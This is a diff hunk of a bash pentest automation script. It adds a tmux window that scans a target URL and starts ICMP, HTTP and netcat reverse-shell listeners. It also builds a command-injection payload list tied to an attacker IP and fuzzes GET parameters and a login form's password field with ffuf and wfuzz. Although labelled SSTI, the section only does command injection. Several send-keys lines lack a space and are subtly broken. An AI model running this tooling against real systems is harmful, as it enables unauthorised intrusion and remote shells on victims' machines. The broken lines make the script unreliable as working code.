@@ -3406,14 +3406,52 @@ tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-T
 cd $folderProject
 
 
+
+
+# WEB SSTI
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:8 -n 'WEB SSTI'
+tmux split-window -v -t PT:8.0
+tmux resize-pane -t PT:8.0 -y 3
+tmux split-window -v -t PT:8.1
+tmux select-pane -t "8.1"
+tmux split-window -h -t "8.1"
+tmux split-window -h -t "8.1"
+tmux split-window -v -t PT:8.4
+tmux select-pane -t "8.4"
+tmux split-window -h -t "8.4"
+tmux split-window -h -t "8.4"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:8.0 "# automate command injection scan" Enter
+tmux send-keys -t PT:8.0 "sudo uniscan -u $url -qweds"
+tmux send-keys -t PT:8.1 "# activate listener ICMP" Enter
+tmux send-keys -t PT:8.1 "sudo tcpdump -i tun0 icmp"
+tmux send-keys -t PT:8.2 "# activate listener HTTP" Enter
+tmux send-keys -t PT:8.2 "python3 -m http.server 80"
+tmux send-keys -t PT:8.3 "# activate listener for reverse shell on port 9001" Enter
+tmux send-keys -t PT:8.3 "nc -nlvp 9001"
+#Preparo il file per le command injection
+cd $folderProjectEngine
+python ./cmdGenerator.py $attackerIP injection.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:8.4"# command injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:8.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
+tmux send-keys -t PT:8.5"# command injection automation (GET)" Enter
+tmux send-keys -t PT:8.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
+tmux send-keys -t PT:8.6 "# command injection automation (POST)" Enter
+tmux send-keys -t PT:8.6 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+
+
+
+
+
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
-
-
-
-
-
 
 
         *)
